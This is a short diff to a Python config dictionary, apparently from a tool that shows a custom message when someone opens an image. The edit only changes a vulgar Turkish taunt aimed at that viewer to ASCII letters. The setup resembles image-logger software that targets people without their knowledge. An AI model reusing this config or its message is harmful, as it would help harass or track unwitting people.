@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "Tarayıcınızı Götünden Siktim -Freshy", # Message to show
+        "message": "Tarayicinizi Gotunden Siktim -Freshy", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
